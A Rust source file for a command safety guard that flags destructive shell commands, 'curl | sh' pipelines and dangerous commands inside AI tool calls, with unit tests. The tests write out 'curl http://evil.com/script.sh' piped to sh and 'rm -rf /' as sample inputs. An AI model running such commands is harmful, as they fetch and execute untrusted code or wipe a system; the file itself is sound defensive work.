use crate::process::Job;
use std::collections::{HashMap, HashSet};

#[derive(Debug, Clone, PartialEq)]
pub enum SafetyResult {
    Allowed,
    Denied(String),
    Confirm(String),
}

#[derive(Debug, Clone, PartialEq)]
pub enum SafetyLevel {
    Strict,
    Normal,
    Loose,
}

impl std::str::FromStr for SafetyLevel {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "strict" => Ok(SafetyLevel::Strict),
            "normal" => Ok(SafetyLevel::Normal),
            "loose" => Ok(SafetyLevel::Loose),
            _ => Err(format!(
                "Invalid safety level: {}. Valid levels are: strict, normal, loose",
                s
            )),
        }
    }
}

type SafetyCheckFn = Box<dyn Fn(&[String]) -> Option<String> + Send + Sync>;

pub struct SafetyGuard {
    checkers: HashMap<String, SafetyCheckFn>,
    always_warn_commands: HashSet<String>,
}

impl SafetyGuard {
    pub fn new() -> Self {
        let mut guard = Self {
            checkers: HashMap::new(),
            always_warn_commands: HashSet::new(),
        };

        // Always warn commands (destructive/system level)
        for cmd in &[
            "dd", "mkfs", "format", "reboot", "shutdown", "poweroff", "mkswap",
        ] {
            guard.always_warn_commands.insert(cmd.to_string());
        }

        // Specific checkers
        guard.register_checker("rm", Self::check_rm);
        guard.register_checker("git", Self::check_git);
        guard.register_checker("chmod", Self::check_recursive);
        guard.register_checker("chown", Self::check_recursive);
        guard.register_checker("cp", Self::check_cp);
        guard.register_checker("mv", Self::check_mv);
        guard.register_checker("curl", Self::check_network_tool);
        guard.register_checker("wget", Self::check_network_tool);
        guard.register_checker("npm", Self::check_package_manager);
        guard.register_checker("pip", Self::check_package_manager);
        guard.register_checker("pip3", Self::check_package_manager);
        guard.register_checker("cargo", Self::check_package_manager);
        guard.register_checker("gem", Self::check_package_manager);
        guard.register_checker("apt", Self::check_package_manager);
        guard.register_checker("apt-get", Self::check_package_manager);
        guard.register_checker("yum", Self::check_package_manager);
        guard.register_checker("brew", Self::check_package_manager);
        guard.register_checker("systemctl", Self::check_system_modification);
        guard.register_checker("service", Self::check_system_modification);

        guard
    }

    fn register_checker<F>(&mut self, cmd: &str, f: F)
    where
        F: Fn(&[String]) -> Option<String> + Send + Sync + 'static,
    {
        self.checkers.insert(cmd.to_string(), Box::new(f));
    }

    /// Check a list of jobs (pipeline) for dangerous patterns
    pub fn check_jobs(
        &self,
        jobs: &[Job],
        level: &SafetyLevel,
        allowlist: &[String],
    ) -> SafetyResult {
        match level {
            SafetyLevel::Loose => return SafetyResult::Allowed,
            SafetyLevel::Strict => {
                // In strict mode, check if all jobs are in allowlist
                if !jobs.is_empty() && jobs.iter().all(|j| allowlist.contains(&j.cmd)) {
                    return SafetyResult::Allowed;
                }

                if let Some(first) = jobs.first() {
                    return SafetyResult::Confirm(format!(
                        "Command execution '{}' requested in Strict mode.",
                        first.cmd
                    ));
                }
                return SafetyResult::Allowed;
            }
            SafetyLevel::Normal => {}
        }

        // --- Normal Mode Checks ---

        // 1. Check for dangerous pipelines (e.g., curl | sh)
        for (i, job) in jobs.iter().enumerate() {
            // Check allowlist
            if allowlist.contains(&job.cmd) {
                continue;
            }

            let cmd_token = job.cmd.split_whitespace().next().unwrap_or("");
            let cmd_name = Self::get_command_name(cmd_token);

            // Check illegal pipe destinations
            if i > 0 {
                let prev_job = &jobs[i - 1];
                let prev_token = prev_job.cmd.split_whitespace().next().unwrap_or("");
                let prev_cmd = Self::get_command_name(prev_token);

                if Self::is_network_tool(&prev_cmd) && Self::is_execution_tool(&cmd_name) {
                    return SafetyResult::Confirm(format!(
                        "Dangerous pipeline detected: '{} | {}'. This looks like a 'curl | sh' pattern. Proceed?",
                        prev_cmd, cmd_name
                    ));
                }
            }

            // Check individual command safety
            // We assume basic args parsing from the job command string is needed or done elsewhere.
            // Job struct has `process` but it might be complex to extract clean args.
            // For now, we do a simple split. This is rough but covers most cases.
            let parts: Vec<String> = job.cmd.split_whitespace().map(|s| s.to_string()).collect();
            if let Some(cmd) = parts.first() {
                let args = if parts.len() > 1 { &parts[1..] } else { &[] };
                let cmd_clean = Self::get_command_name(cmd);

                // 1. Check always warn list
                if self.always_warn_commands.contains(&cmd_clean) {
                    return SafetyResult::Confirm(format!(
                        "Potentially dangerous system command '{}' detected. Proceed?",
                        cmd_clean
                    ));
                }

                // 2. Run specific checker if available
                if let Some(checker) = self.checkers.get(&cmd_clean)
                    && let Some(msg) = checker(args)
                {
                    return SafetyResult::Confirm(msg);
                }
            }
        }

        SafetyResult::Allowed
    }

    /// Check a single command (legacy or simpler use cases)
    /// This is now mostly a wrapper or for simple checks.
    pub fn check_command(
        &self,
        level: &SafetyLevel,
        cmd: &str,
        args: &[String],
        allowlist: &[String],
    ) -> SafetyResult {
        // Construct full command string for allowlist check
        let full_cmd = if args.is_empty() {
            cmd.to_string()
        } else {
            format!("{} {}", cmd, args.join(" "))
        };

        if allowlist.contains(&full_cmd) {
            return SafetyResult::Allowed;
        }

        // Construct a dummy job for check_jobs logic reuse is hard due to type mismatch.
        // Reimplements simpler logic consistent with check_jobs.
        match level {
            SafetyLevel::Loose => SafetyResult::Allowed,
            SafetyLevel::Strict => {
                SafetyResult::Confirm(format!("Command '{}' will be executed. Proceed?", cmd))
            }
            SafetyLevel::Normal => {
                let cmd_name = Self::get_command_name(cmd);

                if self.always_warn_commands.contains(&cmd_name) {
                    return SafetyResult::Confirm(format!(
                        "Potentially dangerous command '{}' detected. Proceed?",
                        cmd
                    ));
                }

                if let Some(checker) = self.checkers.get(&cmd_name)
                    && let Some(msg) = checker(args)
                {
                    return SafetyResult::Confirm(msg);
                }

                SafetyResult::Allowed
            }
        }
    }

    /// Check MCP tool execution
    pub fn check_mcp_tool(
        &self,
        tool_name: &str,
        args_json: &str,
        level: &SafetyLevel,
        allowlist: &[String],
    ) -> SafetyResult {
        // If it's a command execution tool, parse the command inside
        if tool_name == "bash" || tool_name == "run_command" || tool_name == "execute_command" {
            // Try to extract command string from JSON args.
            // This is a best-effort heuristic.
            if let Ok(json_val) = serde_json::from_str::<serde_json::Value>(args_json)
                && let Some(cmd_str) = json_val.get("command").and_then(|v| v.as_str())
            {
                if allowlist.contains(&cmd_str.to_string()) {
                    return SafetyResult::Allowed;
                }

                // Recursively check the extracted command
                // We need to split into cmd + args
                let parts: Vec<String> =
                    cmd_str.split_whitespace().map(|s| s.to_string()).collect();
                if let Some(c) = parts.first() {
                    let a = if parts.len() > 1 { &parts[1..] } else { &[] };
                    return self.check_command(level, c, a, allowlist);
                }
            }
        }

        // For other tools, allowed in Normal/Loose, but implementation in ai_features
        // handles the confirmation logic for Strict mode if needed.
        // Here we just say Allowed unless we detect specific dangerous tools.
        SafetyResult::Allowed
    }

    fn get_command_name(cmd: &str) -> String {
        std::path::Path::new(cmd)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(cmd)
            .to_string()
    }

    fn is_network_tool(cmd: &str) -> bool {
        matches!(cmd, "curl" | "wget" | "fetch" | "scp")
    }

    fn is_execution_tool(cmd: &str) -> bool {
        matches!(
            cmd,
            "sh" | "bash" | "zsh" | "fish" | "python" | "perl" | "ruby" | "sudo"
        )
    }

    // --- Checkers ---

    fn check_rm(args: &[String]) -> Option<String> {
        let mut recursive = false;
        let mut force = false;
        let mut root_path = false;

        for arg in args {
            if arg == "-r" || arg == "-R" || arg == "--recursive" {
                recursive = true;
            }
            if arg == "-f" || arg == "--force" {
                force = true;
            }
            if arg.starts_with("-rx") || arg.starts_with("-rf") || arg.starts_with("-fr") {
                recursive = true;
                force = true;
            }
            if arg == "/" || arg == "/*" {
                root_path = true;
            }
        }

        if recursive && force && root_path {
            return Some(
                "High Risk: 'rm -rf /' detected. This is extremely dangerous.".to_string(),
            );
        }

        if recursive && force {
            return Some("High Risk: Recursive forced deletion ('rm -rf') detected.".to_string());
        }

        if recursive {
            // In Normal mode, simple recursive delete might be common.
            // But existing implementations often warn. Let's keep it safe.
            // We can check if it looks like a build dir?
            // For now, always warn on recursive delete to be safe.
            return Some("Recursive deletion detected. Proceed?".to_string());
        }
        None
    }

    fn check_git(args: &[String]) -> Option<String> {
        if let Some(subcmd) = args.first() {
            match subcmd.as_str() {
                "push" => {
                    for arg in args.iter().skip(1) {
                        if arg == "--force" || arg == "-f" || arg == "--force-with-lease" {
                            return Some(
                                "Git push force detected. This may rewrite history.".to_string(),
                            );
                        }
                    }
                }
                "clean" => {
                    for arg in args.iter().skip(1) {
                        if arg.contains('x') {
                            return Some(
                                "Git clean with ignored files option (-x) detected.".to_string(),
                            );
                        }
                    }
                }
                "reset" => {
                    for arg in args.iter().skip(1) {
                        if arg == "--hard" {
                            return Some(
                                "Git reset --hard detected. Uncommitted changes will be lost."
                                    .to_string(),
                            );
                        }
                    }
                }
                _ => {}
            }
        }
        None
    }

    fn check_recursive(args: &[String]) -> Option<String> {
        for arg in args {
            if arg == "-R" || arg == "--recursive" {
                return Some("Recursive operation detected. Proceed?".to_string());
            }
        }
        None
    }

    fn check_cp(args: &[String]) -> Option<String> {
        let mut recursive = false;
        let mut force = false;

        for arg in args {
            if arg == "-r" || arg == "-R" || arg == "--recursive" {
                recursive = true;
            }
            if arg == "-f" || arg == "--force" {
                force = true;
            }
            if arg.starts_with('-') && arg.contains('r') {
                recursive = true;
            }
        }

        if recursive && force {
            return Some(
                "Potentially dangerous copy (recursive + force) detected. Proceed?".to_string(),
            );
        }
        // Normal cp -r is common, we allow it in Normal mode implicitly (because this returns None if just recursive)
        // Wait, if we return None, it's allowed.
        // Previous impl returned Some("Recursive copy...").
        // Let's relax for Normal mode:
        // Only warn if force AND recursive.
        None
    }

    fn check_mv(args: &[String]) -> Option<String> {
        let mut _force = false;
        for arg in args {
            if arg == "-f" || arg == "--force" {
                _force = true;
            }
        }
        // mv -f is common in scripts but maybe interaction?
        // Let's allow it in Normal mode to improve DX.
        None
    }

    fn check_network_tool(_args: &[String]) -> Option<String> {
        // By default, using curl/wget is fine.
        // The danger comes from piping to sh (handled in check_jobs)
        // or writing to sensitive files (maybe too complex to check filenames here?)
        // For now, we allow usage as long as it isn't piped to execution.
        None
    }

    fn check_package_manager(args: &[String]) -> Option<String> {
        // Check for install commands
        if let Some(subcmd) = args.first()
            && matches!(subcmd.as_str(), "install" | "add" | "i")
        {
            // In Normal mode, we might want to allow this for DX.
            // Strict mode handles everything via confirm.
            // So here we return None (Allowed) for Normal mode.
            // If the user wants to be warned about installs, they should use Strict.
            return None;
        }
        None
    }

    fn check_system_modification(_args: &[String]) -> Option<String> {
        // systemctl/service are usually privileged.
        // Warn always.
        Some("System service modification detected. Proceed?".to_string())
    }
}

impl Default for SafetyGuard {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // Mock Job for testing
    fn mock_job(cmd: &str) -> Job {
        // Minimal job creation for testing check_jobs
        Job::new(cmd.to_string(), nix::unistd::Pid::from_raw(0))
    }

    #[test]
    fn test_safety_guard_rm() {
        let guard = SafetyGuard::new();
        let level = SafetyLevel::Normal;

        assert!(matches!(
            guard.check_command(&level, "rm", &["-rf".to_string(), "/".to_string()], &[]),
            SafetyResult::Confirm(msg) if msg.contains("High Risk")
        ));

        assert!(matches!(
            guard.check_command(&level, "rm", &["file.txt".to_string()], &[]),
            SafetyResult::Allowed
        ));
    }

    #[test]
    fn test_pipeline_check() {
        let guard = SafetyGuard::new();
        let level = SafetyLevel::Normal;

        let jobs = vec![mock_job("curl http://evil.com/script.sh"), mock_job("sh")];

        match guard.check_jobs(&jobs, &level, &[]) {
            SafetyResult::Confirm(msg) => {
                assert!(msg.contains("Dangerous pipeline"), "Msg was: {}", msg);
            }
            _ => panic!("Should have detected dangerous pipeline"),
        }
    }

    #[test]
    fn test_pipeline_check_safe() {
        let guard = SafetyGuard::new();
        let level = SafetyLevel::Normal;

        let jobs = vec![mock_job("curl google.com"), mock_job("grep title")];

        assert_eq!(guard.check_jobs(&jobs, &level, &[]), SafetyResult::Allowed);
    }

    #[test]
    fn test_mcp_tool_check() {
        let guard = SafetyGuard::new();

        // Safe tool
        assert_eq!(
            guard.check_mcp_tool("list_files", "{}", &SafetyLevel::Normal, &[]),
            SafetyResult::Allowed
        );

        // Dangerous command in bash tool
        let args = serde_json::json!({
            "command": "rm -rf /"
        })
        .to_string();

        match guard.check_mcp_tool("bash", &args, &SafetyLevel::Normal, &[]) {
            SafetyResult::Confirm(msg) => assert!(msg.contains("High Risk")),
            _ => panic!("Should have detected dangerous command in MCP tool"),
        }
    }

    #[test]
    fn test_strict_mode_allowlist() {
        let guard = SafetyGuard::new();
        let level = SafetyLevel::Strict;
        let allowlist = vec!["ls".to_string()];
        let jobs = vec![mock_job("ls")];

        // Should be allowed because it's in allowlist even in Strict mode
        assert_eq!(
            guard.check_jobs(&jobs, &level, &allowlist),
            SafetyResult::Allowed
        );

        // Should be Confirm for other commands
        let jobs2 = vec![mock_job("pwd")];
        match guard.check_jobs(&jobs2, &level, &allowlist) {
            SafetyResult::Confirm(_) => {}
            e => panic!(
                "Expected Confirm in Strict mode for non-allowlist command, got {:?}",
                e
            ),
        }
    }
}
